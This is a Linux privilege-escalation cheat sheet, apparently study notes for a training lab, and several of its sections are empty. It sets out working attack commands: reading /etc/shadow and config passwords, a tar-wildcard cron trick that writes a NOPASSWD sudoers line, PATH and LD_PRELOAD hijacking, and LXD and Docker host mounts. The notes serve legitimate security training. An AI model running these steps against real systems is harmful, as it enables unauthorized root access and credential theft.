# Information Gathering

## -Environment Enumeration-

**Helper Scripts**

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | [LinEnum](https://github.com/rebootuser/LinEnum) | [Lynis](https://github.com/CISOfy/lynis)

| **Command**                                                              | **Description**                                                 |
| ------------------------------------------------------------------------ | --------------------------------------------------------------- |
| `whoami`                                                                 | Describes current user                                          |
| `id`                                                                     | Describes the groups that the current user belongs to           |
| `hostname`                                                               | What the is server named                                        |
| `ifconfig or ip -a`                                                      | What subnet the server is in                                    |
| `sudo -l`                                                                | can the user run anything with sudo                             |
| `cat /etc/os-release`                                                    | Check OS and version                                            |
| `echo $PATH`                                                             | Check the current users path                                    |
| `env`                                                                    | Check all environment variables for user                        |
| `uname -a`                                                               | Check the Kernel version                                        |
| `lscpu`                                                                  | Information about the host itself such as the CPU type/version  |
| `cat /etc/shells`                                                        | What login shells exist on the server                           |
| `lsblk`                                                                  | Look at the drives and any shares on the system                 |
| `lpstat`                                                                 | Find information about any printers attached to the system      |
| `cat /etc/fstab`                                                         | Check for mounted drive creds by grepping for username/password |
| `route or netstat -rn`                                                   | Check routing table                                             |
| `/etc/resolv.conf`                                                       | Useful for domain joined servers                                |
| `arp -a`                                                                 | Check the ARP table for other hosts                             |
| `cat /etc/passwd`                                                        | Find info about users on the system                             |
| `cat /etc/shadow`                                                        | Login info for users (unlikely to be readable without root)     |
| `cat /etc/group`                                                         | Find information about the system groups (and users)            |
| `getent group sudo`                                                      | Query group file for interesting groups/users                   |
| `ls -lisa /home`                                                         | ALWAYS check the home directory for current user and others     |
| `df -h`                                                                  | General information about the linux distro                      |
| `cat /etc/fstab \| grep -v "#" \| column -t`                             | Find unmounted file systems                                     |
| `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep <USER>` | Find all hidden user files                                      |
| `find / -type d -name ".*" -ls 2>/dev/null`                              | Find all hidden directories                                     |
| `ls -lisa /tmp /var/tmp /dev/shm`                                        | Check tmp folders for scripts or other loot                     |

## -Linux Services & Internals Enumeration-

| **Command**                                                                                                                                                                              | **Description**                                                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| `cat /etc/hosts`                                                                                                                                                                         | Describes current users hosts file                                                   |
| `lastlog`                                                                                                                                                                                | Find the last login time for user                                                    |
| `who or finger`                                                                                                                                                                          | Check if anyone is on the system at the same time                                    |
| `history`                                                                                                                                                                                | Check the users command history                                                      |
| `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                                                                                                     | Find any special history files created by scripts/programs                           |
| `ls -la /etc/cron.daily/`                                                                                                                                                                | Show all daily cron jobs on the system                                               |
| `find /proc -name cmdline -exec cat {} \; 2>/dev/null\| tr " " "\n"`                                                                                                                     | Find information from proc/procfs file system on processes, hardware, etc            |
| `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list`                                                                               | List of installed packages                                                           |
| `for i in $(curl -s https://gtfobins.github.io/ \| html2text \| cut -d" " -f1 \| sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done` | Bash one-liner that will compare installed binaries to GTFObins to investigate later |
| `sudo -V`                                                                                                                                                                                | Check the sudo version for known exploits                                            |
| `ls -l /bin /usr/bin/ /usr/sbin/`                                                                                                                                                        | Look for compiled binaries installed on system                                       |
| `ps aux \| grep root`                                                                                                                                                                    | Find services running as root user                                                   |
| `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\\\|snap\\\|share"`                                                                                                              | Find all scripts on system                                                           |
| `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                                                                                                      | Find all configuration files                                                         |
| `strace ping -c1 <IP ADDR>`                                                                                                                                                              | Linix diagnostic tool to track and analyze system calls and signal processing        |

## -Credentials Hunting-

| **Command**                                                       | **Description**                                                      |
| ----------------------------------------------------------------- | -------------------------------------------------------------------- |
| `cat wp-config.php \| grep 'DB_USER\|DB_PASSWORD'`                | ALWAYS check web root for creds (example WP site MySQL SB)           |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Find spool or mail directories to check for creds                    |
| `ls ~/.ssh`                                                       | Check current user for SSH keys and known_hosts file to find targets |

# Environment-based Privilege Escalation

## -Path Abuse-

| **Command**                                          | **Description**                                                         |
| ---------------------------------------------------- | ----------------------------------------------------------------------- |
| `echo $PATH or env \| grep PATH`                     | Check the contents of the PATH variable                                 |
| `PATH=.:${PATH} && export PATH && echo $PATH`        | Add the '.' current dir to user's PATH to abuse PATH                    |
| `touch ls && echo 'echo "TEST"' > ls && chmod +x ls` | _Example of how path abuse can be used if current dir is added to PATH_ |

## -Wildcard Abuse-

This attack is based on the environment available. An example of this type of attack follows:

Take the following vulnerable cron job on the victim's system:

```
#
#
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

The wildcard in the cronjob can be abused when the attacker commands are written as file names. This causes the cronjob to run the attacker commands:

```
user@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
user@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
user@NIX02:~$ echo "" > --checkpoint=1
```

## -Escaping Restricted Shells-

**Types of restricted shells:**

[Restricted Bourne shell (rbash)](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) | [Restricted Korn shell (rksh)](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) | [Restricted Z shell (rzsh)](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)

When in a restricted shell there will be a pre-defined set of actions that are allowed. The first step in escaping is determining the capabilities of the shell.

Take the example scenario where the restricted shell only allows `ls -l` or `ls -a` to be run. In this case command injection may be possible to escape the shell by injecting additional commands into the args of the ls command.

```
Anon4Now@NIX[/home]$ ls -l `pwd`
```

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow for the execution of the pwd command and seeing the current working directory, even though the shell does not allow us to execute the pwd command directly.

Other possible techniques:

- Command Substitution: This involves using the shell's command substitution syntax to execute a command.
- Command Chaining: Use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.
- Environment Variables: Modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: Define and call shell functions that execute commands not restricted by the shell.

# Permissions-based Privilege Escalation

## -Special Permissions-

| **Command**                                                     | **Description**                 |
| --------------------------------------------------------------- | ------------------------------- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with SGID bit set |

## -Sudo Rights Abuse-

| **Command** | **Description**                           |
| ----------- | ----------------------------------------- |
| `sudo -l`   | Check if current user has sudo privileges |

## -Privileged Groups-

**LXC/LXD**
LXD is similar to Docker and is Ubuntu's container manager. If the user is part of the 'lxd' group, this may be an opportunity for privilege escalation.

Example below using an alpine image being pushed or found on victim machine.

_Unzip the Alpine image_

```
devops@NIX02:~$ unzip alpine.zip
```

_Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step_

```
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes
```

_Import the local image_

```
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

_Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host_

```
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
```

_Mount the host file system_

```
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

_Finally, spawn a shell inside the container instance. Browse to cd /mnt/root/root to see root files_

```
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
```

**Docker**

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers.

The below example command creates a new Docker instance with the /root directory on the host file system mounted as a volume.

```
devops@NIX02:~$ docker run -v /root:/mnt -it ubuntu
```

**Disk**

Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges.

**ADM**

Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

## -Capabilities-

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.

| **Capability**       | **Description**                                                                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cap_sys_admin        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| cap_sys_chroot`      | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
|                      |
| cap_sys_ptrace       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| cap_sys_nice         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| cap_sys_time         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| cap_sys_resource     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
|                      |
| cap_sys_module       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| cap_net_bind_service | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

# Service-based Privilege Escalation

## -Vulnerable Services-

## -Cron Job Abuse-

## -Containers-

## -Logrotate-

## -Misc Techniques-

# Linux Internals-based Privilege Escalation

## Kernel Exploits

## Shared Libraries

## Shared Object Hijacking

## Python Library Hijacking

# Recent 0-Days (as of 6-16-23)

## Sudo

## Polkit

## Dirty Pipe

## Netfilter

| **Command**                                                                         | **Description**                                       |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
| Â `ps aux \| grep root`                                                              | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |
| `uname -a`                                                                          | Check the Kernel versiion                             |
| `cat /etc/lsb-release `                                                             | Check the OS version                                  |
| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of `Screen`               |
| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |
| `readelf -d payroll  \| grep PATH`                                                  | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compiled a shared libary                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Created a shared `tmux` session socket                |
| `./lynis audit system`                                                              | Perform a system audit with `Lynis`                   |
